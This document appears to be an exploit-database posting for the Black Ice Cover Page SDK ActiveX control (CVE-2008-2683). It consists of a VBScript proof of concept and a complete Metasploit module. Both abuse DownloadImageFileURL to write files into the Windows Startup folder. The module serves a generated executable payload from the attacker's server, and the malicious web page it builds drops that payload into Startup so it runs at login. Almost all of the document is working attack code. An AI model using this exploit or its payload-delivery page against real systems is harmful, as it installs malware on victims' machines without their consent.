Blackice Cover Page SDK insecure method DownloadImageFileURL() exploit
<!--
RegKey Safe for Script: True
RegkeySafe for Init: True
KillBitSet: False
vendor: http://www.blackice.com/
software link: http://www.blackice.com/DownloadForms/downloadformimp.asp?product=Cover+Page+Generator
-->
 
<object classid=&#039;clsid:79956462-F148-497F-B247-DF35A095F80B&#039; id=&#039;target&#039; ></object>
<script language=&#039;vbscript&#039;>
 
arg1="http://www.google.com/robots.txt"
arg2="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\robots.txt"
 
target.DownloadImageFileURL arg1 ,arg2
</script>
</html>
 
# MSF Module
##
# $Id: blackice_coverpage_download.rb 12540 2011-06-20 20:43:19Z mr_me $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({
        :os_name    => OperatingSystems::WINDOWS,
        :javascript => true,
        :rank       => NormalRanking,
        :vuln_test  => nil,
    })
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Black Ice Cover Page ActiveX Control Arbitrary File Download&#039;,
            &#039;Description&#039;    => %q{
                    This module allows remote attackers to place arbitrary files on a users file system
                by abusing the "DownloadImageFileURL" method in the Black Ice BIImgFrm.ocx ActiveX Control (BIImgFrm.ocx 12.0.0.0).
                This issue is also reported in BIDIB.ocx (10.9.3.0) within the Barcode SDK.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [
                        &#039;shinnai&#039;,  # original discovery
                        &#039;mr_me&#039;     # msf
                        ],
            &#039;Version&#039;        => &#039;$Revision: 12540 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2008-2683&#039;],
                    [ &#039;OSVDB&#039;, &#039;46007&#039;],
                    [ &#039;BID&#039;, &#039;29577&#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/5750/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 2048,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 20 2011&#039;))
 
        register_options(
            [
                OptString.new(&#039;PATH&#039;, [ true, &#039;The path to place the executable.&#039;, &#039;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\&#039;]),
            ], self.class)
    end
 
    def autofilter
        false
    end
 
    def check_dependencies
        use_zlib
    end
 
    def on_request_uri(cli, request)
 
        payload_url =  "http://"
        payload_url += (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
        payload_url += ":" + datastore[&#039;SRVPORT&#039;] + get_resource() + "/payload"
 
        if (request.uri.match(/payload/))
            return if ((p = regenerate_payload(cli)) == nil)
            data = generate_payload_exe({ :code => p.encoded })
            print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
            send_response(cli, data, { &#039;Content-Type&#039; => &#039;application/octet-stream&#039; })
            return
        end
 
        # random junk
        vname  = rand_text_alpha(rand(100) + 1)
        exe    = rand_text_alpha(rand(20) + 1)
        clsid  = "79956462-F148-497F-B247-DF35A095F80B"
        blackice = rand_text_alpha(rand(100) + 1)
        method = "DownloadImageFileURL"
        arg1 = rand_text_alpha(rand(100) + 1)
        arg2 = rand_text_alpha(rand(100) + 1)
 
        content = <<-EOS
        <html>
        <object classid=&#039;clsid:#{clsid}&#039; id=&#039;#{blackice}&#039; ></object>
        <script language=&#039;vbscript&#039;>
        #{arg1} = "#{payload_url}"
        #{arg2} = "#{datastore[&#039;PATH&#039;]}#{exe}.exe"
        #{blackice}.#{method} #{arg1}, #{arg2}
        </script>
        </html>
        EOS
 
        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
 
        send_response_html(cli, content)
 
        handler(cli)
 
    end
 
end



